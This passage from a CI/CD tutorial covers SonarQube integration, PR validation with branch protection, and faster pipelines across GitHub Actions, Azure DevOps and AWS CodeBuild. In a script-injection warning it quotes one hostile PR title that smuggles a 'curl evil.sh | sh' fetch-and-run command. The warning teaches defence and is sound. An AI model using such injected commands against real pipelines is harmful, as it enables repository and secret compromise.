      - run: npm ci && npm test -- --coverage   # produces coverage/lcov.info
      - uses: SonarSource/sonarqube-scan-action@v4
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ vars.SONAR_HOST_URL }}    # e.g. https://sonarcloud.io
        with:
          args: >
            -Dsonar.qualitygate.wait=true
            -Dsonar.javascript.lcov.reportPaths=coverage/lcov.info
```

### Azure DevOps (SonarQube extension)

```yaml
steps:
  - checkout: self
    fetchDepth: 0

  - task: SonarQubePrepare@7
    inputs:
      SonarQube: sonarqube-connection        # service connection name
      scannerMode: cli
      configMode: manual
      cliProjectKey: acme_orders-api
      extraProperties: |
        sonar.javascript.lcov.reportPaths=coverage/lcov.info

  - script: npm ci && npm test -- --coverage
    displayName: Test with coverage

  - task: SonarQubeAnalyze@7
  - task: SonarQubePublish@7                 # waits for and shows the quality gate result
    inputs:
      pollingTimeoutSec: '300'
```

### AWS CodeBuild

```yaml
version: 0.2

env:
  secrets-manager:
    SONAR_TOKEN: ci/sonar:token
  variables:
    SONAR_HOST_URL: https://sonar.acme.internal

phases:
  install:
    runtime-versions:
      nodejs: 20
  build:
    commands:
      - npm ci && npm test -- --coverage
      - >
        docker run --rm -e SONAR_TOKEN -e SONAR_HOST_URL
        -v "$CODEBUILD_SRC_DIR:/usr/src"
        sonarsource/sonar-scanner-cli:11
        -Dsonar.projectKey=acme_orders-api
        -Dsonar.qualitygate.wait=true
        -Dsonar.javascript.lcov.reportPaths=coverage/lcov.info
```

**🔍 Explained:**

- **`fetch-depth: 0`:** checkouts are shallow by default (only the last commit). Sonar needs
  history to know which code is "new".
- **`sonar.qualitygate.wait=true`** makes the scanner wait for the server's verdict and exit
  non-zero if the gate fails, which fails the pipeline.
- **Sonar doesn't run your tests.** It only *reads* coverage reports the pipeline produced
  earlier. No report means 0% coverage.

**⚠️ Gotchas:**

- **ADO: the `SonarQube*` task major versions must match** (all `@7` or all `@6`). Mixing them
  fails with confusing errors.
- **The scanner must reach the Sonar server.** A SonarQube Server inside a private network
  needs self-hosted agents or a CodeBuild project inside the VPC.

---

## Scenario 14 — PR validation and branch protection

**🎯 Goal:** Nobody can merge to `main` unless CI passes and someone reviews the change.
CI also posts a helpful comment on the PR.

### GitHub — branch protection / rulesets (repo Settings → Rules)

- Require a pull request before merging, with ≥ 1 approval.
- Require status checks to pass: select the **job names** (e.g. `ci-ok`).
- Require branches to be up to date before merging.
- Block force pushes and deletions.

Workflow that comments on the PR:

```yaml
name: PR checks
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read
  pull-requests: write          # needed to comment

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Check PR title follows Conventional Commits
        env:
          TITLE: ${{ github.event.pull_request.title }}   # pass via env — never inline (injection!)
        run: |
          echo "$TITLE" | grep -Eq '^(feat|fix|docs|chore|refactor|test|ci)(\(.+\))?!?: .+' \
            || { echo "::error::PR title must look like 'feat(api): add orders endpoint'"; exit 1; }

      - name: Bundle size report
        run: |
          npm ci && npm run build
          SIZE=$(du -sh dist | cut -f1)
          echo "BUNDLE_SIZE=$SIZE" >> "$GITHUB_ENV"

      - name: Comment on PR
        uses: actions/github-script@v7
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `📦 Bundle size: **${process.env.BUNDLE_SIZE}**`
            });
```

### Azure DevOps — branch policies (Repos → Branches → `main` → Branch policies)

- Require a minimum number of reviewers.
- Check for linked work items.
- Check for comment resolution.
- **Build validation:** pick the CI pipeline, with trigger "Automatic" and the policy "Required".
- Limit merge types (e.g. squash only).

Posting a PR comment from a pipeline uses the REST API with the build's own token:

```yaml
steps:
  - bash: |
      SIZE=$(du -sh dist | cut -f1)
      curl -sS -X POST \
        -H "Authorization: Bearer $SYSTEM_ACCESSTOKEN" \
        -H "Content-Type: application/json" \
        "$(System.CollectionUri)$(System.TeamProject)/_apis/git/repositories/$(Build.Repository.ID)/pullRequests/$(System.PullRequest.PullRequestId)/threads?api-version=7.1" \
        -d "{\"comments\":[{\"content\":\"📦 Bundle size: **$SIZE**\"}],\"status\":\"closed\"}"
    displayName: Comment on PR
    condition: eq(variables['Build.Reason'], 'PullRequest')
    env:
      SYSTEM_ACCESSTOKEN: $(System.AccessToken)   # must be mapped explicitly
```

> The **Build Service** identity needs the "Contribute to pull requests" permission on the repo.

### AWS — CodeBuild PR builds report status back to GitHub/Bitbucket

With a PR webhook filter (Scenario 2), CodeBuild reports a **commit status** to GitHub (the
project's "Report build statuses" setting). Make that check **required** in GitHub branch
protection, using the context name CodeBuild reports.

**🔍 Explained:**

- **Branch protection** is configured in the **repo settings**, not in pipeline YAML. The
  pipeline only *produces* the status check that the protection rule requires.
- **`::error::message`** is a GitHub "workflow command". It shows a red annotation in the UI.
- **`$GITHUB_ENV`** sets an environment variable for all **later steps** in the same job.

**⚠️ Gotchas:**

- **Script injection.** Never write `run: echo "${{ github.event.pull_request.title }}"`. A PR
  titled `"; curl evil.sh | sh; "` would execute. Always pass untrusted input through `env:`.
- **`pull_request_target` is dangerous.** It runs with secrets and write permissions **in the
  context of the base repo**. Checking out and running fork code inside it is a well-known way
  to compromise a repo. Avoid it unless you fully understand it.

---

## Scenario 15 — Making slow pipelines fast

**🎯 Goal:** A 25-minute pipeline should take under 8 minutes.

### Step 1 — cache correctly (GitHub `actions/cache` for anything)

```yaml
- uses: actions/cache@v4
  with:
    path: |
      ~/.cache/pip
      ~/.cache/pre-commit
    key: ${{ runner.os }}-py-${{ hashFiles('requirements*.txt', '.pre-commit-config.yaml') }}
    restore-keys: |
      ${{ runner.os }}-py-
```

| Part | Meaning |
|------|---------|
| `key` | Exact cache ID. `hashFiles()` changes whenever dependency files change |
| `restore-keys` | Prefix fallbacks: if no exact match, restore the newest cache whose key starts with this |
| Cache **hit** | Exact key found, so the cache isn't saved again at the end |
| Cache **miss** | Restore from a fallback (if any), run, then save under the new key |

### Step 2 — shard slow test suites across parallel machines

**GitHub Actions (Playwright sharding):**

```yaml
jobs:
  e2e:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci && npx playwright install --with-deps chromium
      - run: npx playwright test --shard=${{ matrix.shard }}/4
```

**Azure DevOps (parallel job slicing):**

```yaml
jobs:
  - job: E2E
    strategy:
      parallel: 4               # 4 copies of this job
    pool: { vmImage: ubuntu-latest }
    steps:
      - script: npm ci && npx playwright install --with-deps chromium
      # System.JobPositionInPhase is 1..4, System.TotalJobsInPhase is 4
      - script: npx playwright test --shard=$(System.JobPositionInPhase)/$(System.TotalJobsInPhase)
```

**AWS CodeBuild (batch matrix as shards):**

```yaml
version: 0.2
batch:
  build-matrix:
    dynamic:
      env:
        variables:
          SHARD: ["1", "2", "3", "4"]
phases:
  install:
    runtime-versions: { nodejs: 20 }
    commands:
      - npm ci && npx playwright install --with-deps chromium
  build:
    commands:
      - npx playwright test --shard=${SHARD}/4
```

### Step 3 — the speed checklist

| Technique | Typical saving |
|-----------|----------------|
| Dependency caching | 1–5 min per job |
| Docker layer caching (Chapter 02) | 2–10 min |
| Test sharding | Divides test time by the number of shards |
| Run lint/unit before slow e2e (fail fast) | Bad PRs fail in 2 min, not 20 |
| Path filters / affected-only builds | Skips whole jobs |
| `concurrency` with cancel-in-progress (Chapter 06) | Stops wasting runs on outdated commits |
| Shallow clone (`fetch-depth: 1`, the GitHub default) | Seconds to minutes on big repos |
| Bigger runners (more CPU) for compile-heavy jobs | Often cheaper overall (less time × higher rate) |
| Skip CI for docs-only changes | Whole runs avoided |

**⚠️ Gotchas:**

- **GitHub's cache limit is 10 GB per repo**, with the least recently used caches evicted
  first. Huge caches thrash each other.
- **Caches are branch-scoped.** A PR can read caches from its base branch, but not from other
  PRs. The first run on a new branch is slower. That's expected.
- **A wrong cache key gives stale results.** If the key doesn't include everything that affects
  the content (OS, tool version, lock file), you'll restore incompatible files.

---

**Next:** [02 — Container Pipelines ➡️](02-containers.md)
